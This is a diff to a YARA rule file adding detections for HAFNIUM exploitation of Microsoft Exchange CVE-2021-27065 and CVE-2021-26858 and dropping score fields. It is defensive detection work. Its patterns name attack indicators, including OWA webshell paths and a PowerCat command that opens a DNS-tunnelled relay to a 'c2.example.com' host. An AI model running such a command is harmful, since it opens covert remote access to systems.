@@ -1,9 +1,32 @@
 
+rule EXPL_LOG_CVE_2021_27065_Exchange_Forensic_Artefacts_Mar21_1 {
+   meta:
+      description = "Detects forensic artefacts found in HAFNIUM intrusions exploiting CVE-2021-27065"
+      author = "Florian Roth"
+      reference = "https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/"
+      date = "2021-03-02"
+   strings:
+      $s1 = "S:CMD=Set-OabVirtualDirectory.ExternalUrl='" ascii wide fullword
+   condition:
+      1 of them
+}
+
+rule EXPL_LOG_CVE_2021_26858_Exchange_Forensic_Artefacts_Mar21_1 {
+   meta:
+      description = "Detects forensic artefacts found in HAFNIUM intrusions exploiting CVE-2021-26858"
+      author = "Florian Roth"
+      reference = "https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/"
+      date = "2021-03-02"
+   strings:
+      $xr1 = /POST[^\n]{1,40}(\/owa\/auth\/Current\/themes\/resources\/logon\.css|\/owa\/auth\/Current\/themes\/resources\/owafont_ja\.css|\/owa\/auth\/Current\/themes\/resources\/lgnbotl\.gif|\/owa\/auth\/Current\/themes\/resources\/owafont_ko\.css|\/owa\/auth\/Current\/themes\/resources\/SegoeUI-SemiBold\.eot|\/owa\/auth\/Current\/themes\/resources\/SegoeUI-SemiLight\.ttf|\/owa\/auth\/Current\/themes\/resources\/lgnbotl\.gif)/   
+   condition:
+      $xr1
+}
+
 rule APT_HAFNIUM_Forensic_Artefacts_Mar21_1 {
    meta:
       description = "Detects forensic artefacts found in HAFNIUM intrusions"
       author = "Florian Roth"
-      score = 85
       reference = "https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/"
       date = "2021-03-02"
    strings:
@@ -20,7 +43,6 @@ rule HKTL_PS1_PowerCat_Mar21 {
       author = "Florian Roth"
       reference = "https://github.com/besimorhino/powercat"
       date = "2021-03-02"
-      score = 80
       hash1 = "c55672b5d2963969abe045fe75db52069d0300691d4f1f5923afeadf5353b9d2"
    strings:
       $x1 = "powercat -l -p 8000 -r dns:10.1.1.1:53:c2.example.com" ascii fullword
